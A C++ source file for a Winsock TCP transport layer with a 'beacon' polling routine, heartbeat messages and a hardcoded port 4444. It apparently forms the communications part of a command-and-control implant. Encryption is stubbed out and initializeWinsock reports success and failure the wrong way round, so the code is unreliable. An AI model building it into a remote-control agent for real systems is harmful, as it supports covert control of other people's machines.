#include "TransportLayer.h"
#include "MessageTypes.h"
#include "MessageHandler.h"
//
#include <winsock2.h>
#include <ws2tcpip.h>

#include <iostream>
#pragma comment(lib, "ws2_32.lib")

TransportLayer::TransportLayer(
		MessageHandler& handler,
		SerializerUniquePtr serializer,
		EncoderUniquePtr encoder,
		EncryptorUniquePtr encryptor,
		SerializerType serializerType,
		EncoderType encoderType,
		EncryptorType encryptorType)
		:
		messageHandler_(handler)
{
	serializer_ = serializer ? std::move(serializer) : ComponentFactory::create(serializerType);
	encoder_ = encoder ? std::move(encoder) : ComponentFactory::create(encoderType);
	encryptor_ = encryptor ? std::move(encryptor) : ComponentFactory::create(encryptorType);
}

bool TransportLayer::sendMessage(const InternalMessage& msg)
{
    //auto serialized = serializer_.serialize(msg);
    //auto encoded = encoder_.encode(serialized);
    //auto encrypted = encryptor_.encrypt(encoded);
    //return send(encrypted);
    return send(serializer_->serialize(msg));
}

InternalMessage TransportLayer::receiveMessage()
{
    auto data = receive();
    if (data.empty()) 
	{
		return InternalMessage();
	}

    //auto decrypted = encryptor_.decrypt(data);
    //auto decoded = encoder_.decode(decrypted);
    //return serializer_.deserialize(decoded);
    return serializer_->deserialize(data);
}

void TransportLayer::beacon()
{
    //auto heartbeat = createHeartbeat();
    //sendMessage(heartbeat);

    auto incoming = receiveMessage();
    if (incoming.header.messageType != DEFAULT)
    {
        messageHandler_.processMessage(incoming); // change to not use ptr?
    }
}

InternalMessage TransportLayer::createHeartbeat()
{
    InternalMessage msg;
    msg.header.messageType = MessageType::HEARTBEAT;
    msg.header.messageId = generateId();
    msg.header.dataSize = 0;
    return msg;
}

uint32_t TransportLayer::generateId()
{
    return rand();
}


//TCPTransportLayer::TCPTransportLayer(MessageHandler* hdlr, const std::string& server, uint16_t port)
TCPTransportLayer::TCPTransportLayer(
		MessageHandler& messageHandler, 
		const std::string& server, 
		const std::string& port,
		SerializerUniquePtr serializer,
		EncoderUniquePtr encoder,
		EncryptorUniquePtr encryptor,
		SerializerType serializerType,
		EncoderType encoderType,
		EncryptorType encryptorType)
    	: 
		TransportLayer(
			messageHandler,
			std::move(serializer),
			std::move(encoder),
			std::move(encryptor),
			serializerType,
			encoderType,
			encryptorType),
		server_(server), 
		port_(port)
{
    initializeWinsock();
}

TCPTransportLayer::~TCPTransportLayer()
{
	/*
    if (connected_ == false) // TODO: maybe check if (socket_ != INVALID_SOCKET)
    {
        // TODO: if 5 attempted connects in a row fail, exit, otherwise keep trying
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
    }
	*/
    WSACleanup();
}


bool TCPTransportLayer::initializeWinsock()
{
    // TODO: check if winsock is already initialized somehow?
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cout << "WSAStartup failed" << std::endl;
        // printf("WSAStartup failed\n");
        return true;
    }
    return false;
    //winsock_initialized = true;
    
}



bool TCPTransportLayer::send(const std::vector<uint8_t>& data)
{
    if (!connected_ && !connect()) return false;
    
    return ::send(socket_, (const char*)data.data(), data.size(), 0) > 0;

}

bool TCPTransportLayer::connect()
{
    socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_ == INVALID_SOCKET)
    {
        std::cout << "socket invalid" << std::endl;
        return false;
    }
    


    ADDRINFOA hints, *result = nullptr;
    ZeroMemory(&hints, sizeof(hints));
    // TODO: do this instead of ZeroMemory
    //ADDRINFOA hints = { 0 };
    //ADDRINFOA* result = nullptr;

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    //if (getaddrinfo(server_.c_str(), (std::to_string(port_)).c_str(), &hints, &result) != 0)
    if (getaddrinfo(server_.c_str(), "4444", &hints, &result) != 0) // TODO: use port_ instead of hardcode
    {
        //std::cout << "getaddrinfo failed" << std::endl;
        printf("getaddrinfo failed\n");
        return false;
    }
    /*
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);
    inet_pton(AF_INET, server_.c_str(), &addr.sin_addr);*/

    ADDRINFOA* ptr = result; // TODO: no need to assign result to ptr just use result?
    while (ptr != NULL)
    {
        if (::connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
        {
            connected_ = true;
            break;
        }
        ptr = ptr->ai_next;
    }

    if (connected_ == false)
    {
        // TODO: if 5 attempted connects in a row fail, exit, otherwise keep trying
        std::cout << "connected_ == false" << std::endl;
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
        return false;
    }

    return true;
}

std::vector<uint8_t> TCPTransportLayer::receive()
{
    if (!connected_) return {};

    std::vector<uint8_t> buffer(4096);
    int received = recv(socket_, (char*)buffer.data(), buffer.size(), 0);
    if (received <= 0)
    {
        connected_ = false;
        return {};
    }
    buffer.resize(received);
    return buffer;
}


